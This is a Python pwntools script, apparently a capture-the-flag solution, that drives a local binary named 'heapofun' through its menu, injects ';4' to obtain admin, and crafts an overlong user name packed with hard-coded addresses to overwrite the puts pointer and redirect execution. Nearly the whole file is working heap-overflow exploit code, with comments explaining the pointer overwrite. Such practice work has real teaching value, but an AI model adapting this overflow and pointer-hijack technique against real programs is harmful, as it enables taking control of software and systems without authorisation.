#!/usr/bin/python

from pwn import *
import os
import subprocess
import sys
import re

row = ord('A')
col = ord('0')
seat = chr(row)+chr(col)


f = open('payload', 'w')

conn = process('./heapofun')

def do(inst):
	conn.sendline(inst)
	f.write(inst + '\n')


def getAdmin():
	do('2')
	conn.recvuntil('>')
	do('Admin')
	conn.recvuntil('>')
	do(';4')

def addUser(name='J'*98):
	do('2')
	conn.recvuntil('>')
	do(name)
	conn.recvuntil('>')
	do(seat)

def hackedUser(addr=''):
	do('8')
	conn.recvuntil('>')
	do('Hack')
	conn.recvuntil('>')
	do(seat)
	conn.recvuntil('>')
	# newName = 'Hack' + 'ZZZZ'*2 + 'where I want to jump -4' + 'puts' + 'size' + 'addr of string'
	newName = 'Hack' + 'ZZZZ'*2 + p32(0x80486a3) + p32(0x0804b024) + 'ZZZZ' + p32(0x804c0f0) #steal someone elses name e.g the second one
	#the result is that puts points to rop code and the second bunch of 8 bytes of our code will be puts
	#our code will need to jump over this garbage


	#This should have the effect of taling were I want to jump and putting  the value of puts -4 at that address
	#and taking puts and putting where I want to jump there 0804b024
	# if len(str(addr)) > 0:
	# 	newName += p32(addr)
	do(newName)



while 1:
	menu = conn.recvuntil('>')
	menu = menu[:-1]
	menu += ' A. Get admin\n' 
	menu += ' B [-n num][-s name]. Add user\n' 
	menu += ' C. Add hacked user\n>' 
	print menu,

	option = raw_input()
	if option == 'A':
		getAdmin()
	elif option[0] == 'B':
		num = 1 #the number of users to add
		name = 'J'*96

		numbers = re.findall("-n\s*([0-9]+)", option)
		if len(numbers) > 0:
			num = int(numbers[0])

		names = re.findall("-s\s*(\w+)", option)
		if len(names) > 0:
			name = names[0]

		for b in range(num):
			addUser(name)
			col += 1
			if col >= ord('6'):
				col = ord('0')
				row += 1
			seat = chr(row)+chr(col)
			if b + 1 < num:
				conn.recvuntil('>') # just to progress things

	elif option == 'C':
		addUser('Hack')
		col += 1
		if col >= ord('6'):
			col = ord('0')
			row += 1
		seat = chr(row)+chr(col)

		conn.recvuntil('>') # this is the menu which we'll ignore

		hackedUser(0x804c0b0)
		col += 1
		if col >= ord('6'):
			col = ord('0')
			row += 1
		seat = chr(row)+chr(col)
	else:

		do(option)
		line = conn.recvuntil('>')
		while not re.search('Choose an option:', line):
			print line + 'lol',
			option = raw_input()
			do(option)
			line = conn.recvuntil('>')
		index = line.find('Choose')
		print line[:index]
		#now it's the menu
		#don't print it jsut do nothing
		do('1') #prints a pun
		conn.recvuntil('\n') #drop the pun





